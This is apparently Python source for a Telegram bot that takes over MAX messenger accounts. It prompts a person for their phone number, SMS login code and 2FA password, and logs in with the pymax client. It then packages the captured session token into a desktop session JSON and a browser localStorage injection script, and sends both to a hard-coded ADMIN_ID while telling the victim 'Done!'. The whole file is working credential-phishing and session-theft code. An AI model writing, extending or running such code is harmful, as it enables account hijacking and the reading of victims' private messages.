class AuthState(StatesGroup):
    waiting_for_code = State()
    waiting_for_password = State()

pending = {}
code_events = {}
password_events = {}
results = {}

def gen_password():
    import random, string
    return ''.join(random.choices(string.ascii_letters + string.digits + "_@#", k=40))

def build_desktop_json(token, device_id, session_id, password, user_id, phone):
    return {
        "token": token,
        "device_id": device_id,
        "session_id": session_id,
        "password": password,
        "connection_params": {
            "device_type": "DESKTOP",
            "app_version": "25.12.13",
            "device_name": "Chrome",
            "os_version": "Windows 10",
            "locale": "ru",
            "device_locale": "ru",
            "screen": "1080x1920",
            "timezone": "Europe/Moscow"
        },
        "user": {
            "user_id": user_id,
            "phone": int(phone.replace("+", "")),
            "photo_id": None,
            "first_name": "",
            "last_name": ""
        }
    }

def generate_web_js(password, device_id, token, viewer_id):
    return f"""PASSWORD: {password}

sessionStorage.clear();
localStorage.clear();
localStorage.setItem('__oneme_device_id', '{device_id}');
localStorage.setItem('__oneme_auth', JSON.stringify({{"token":"{token}","viewerId":{viewer_id}}}));
window.location.reload();"""

async def send_files(phone, uid, work_dir, desktop, js):
    dp = f"{work_dir}/desktop_session.json"
    with open(dp, "w", encoding="utf-8") as f:
        json.dump(desktop, f, ensure_ascii=False, indent=4)
    wp = f"{work_dir}/web_token.js"
    with open(wp, "w", encoding="utf-8") as f:
        f.write(js)
    await bot.send_document(ADMIN_ID, FSInputFile(dp),
        caption=f"💻 ДЕСКТОП\nНомер: {phone}", parse_mode="HTML")
    await bot.send_document(ADMIN_ID, FSInputFile(wp),
        caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")

def pymax_thread(uid, phone, work_dir):
    from pymax import Client as MaxClient
    import builtins
    
    original = builtins.input
    
    def custom_input(prompt=""):
        p = prompt.lower() if prompt else ""
        if "code" in p or "код" in p:
            code_events[uid] = threading.Event()
            code_events[uid].wait()
            return results.pop(f"{uid}_code")
        elif "password" in p or "пароль" in p:
            password_events[uid] = threading.Event()
            password_events[uid].wait()
            return results.pop(f"{uid}_password")
        return original(prompt)
    
    builtins.input = custom_input
    
    try:
        client = MaxClient(phone=phone, work_dir=work_dir)
        client.start()
        
        token = client.token if hasattr(client, 'token') else client.session.token
        user_id = client.my_id if hasattr(client, 'my_id') else client.me.id
        
        results[uid] = {"ok": True, "token": token, "user_id": user_id}
        
    except Exception as e:
        results[uid] = {"ok": False, "error": str(e)}
    finally:
        builtins.input = original

@dp.message(F.text == "/start")
async def start(message: types.Message):
    await message.answer("👋 Отправь номер в формате +79111111111")

@dp.message(F.text.regexp(r'^\+7\d{10}$'))
async def phone_handler(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    uid = message.from_user.id
    work_dir = f"cache/{uid}"
    os.makedirs(work_dir, exist_ok=True)
    
    # Очищаем старую сессию
    db = Path(work_dir) / "session.db"
    if db.exists():
        db.unlink()
    
    pending[uid] = {"phone": phone, "work_dir": work_dir}
    await state.set_state(AuthState.waiting_for_code)
    await state.update_data(phone=phone, work_dir=work_dir, uid=uid)
    
    msg = await message.answer("⏳ Отправляю SMS...")
    
    t = threading.Thread(target=pymax_thread, args=(uid, phone, work_dir), daemon=True)
    t.start()
    
    # Ждём пока pymax запросит код
    for _ in range(60):
        await asyncio.sleep(0.5)
        if uid in code_events:
            await msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")
            return
        if uid in results:
            result = results.pop(uid)
            if result["ok"]:
                # Успех (маловероятно на этом этапе)
                pass
            else:
                error = result["error"].lower()
                if "block" in error:
                    await msg.edit_text("🚫 Аккаунт заблокирован.")
                elif "flood" in error or "limit" in error:
                    await msg.edit_text("⏳ Слишком много попыток.")
                else:
                    await msg.edit_text(f"❌ {result['error']}")
            del pending[uid]
            await state.clear()
            return
    
    await msg.edit_text("❌ Таймаут.")
    del pending[uid]
    await state.clear()

@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
async def code_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    code = message.text.strip()
    
    if uid not in pending:
        return await message.answer("⏳ Сессия устарела.")
    
    data = await state.get_data()
    phone = data["phone"]
    work_dir = data["work_dir"]
    
    results[f"{uid}_code"] = code
    
    if uid in code_events:
        code_events[uid].set()
        del code_events[uid]
    
    msg = await message.answer("⏳ Проверяю код...")
    
    # Ждём результат
    for _ in range(60):
        await asyncio.sleep(0.5)
        if uid in results:
            result = results.pop(uid)
            if result["ok"]:
                token = result["token"]
                viewer_id = result["user_id"]
                password = gen_password()
                session_id = int(time.time() * 1000)
                device_id = str(uuid.uuid4())
                
                desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
                js = generate_web_js(password, device_id, token, viewer_id)
                
                await send_files(phone, uid, work_dir, desktop, js)
                await msg.edit_text("✅ Готово!")
            else:
                error = result["error"].lower()
                if "invalid" in error or "wrong" in error:
                    await msg.edit_text("❌ Неверный код. Попробуй ещё раз.")
                elif "password" in error or "2fa" in error:
                    await state.set_state(AuthState.waiting_for_password)
                    await msg.edit_text("🔐 Введи пароль 2FA:")
                elif "block" in error:
                    await msg.edit_text("🚫 Аккаунт заблокирован.")
                else:
                    await msg.edit_text(f"❌ {result['error']}")
            del pending[uid]
            await state.clear()
            return
    
    await msg.edit_text("❌ Таймаут.")
    del pending[uid]
    await state.clear()
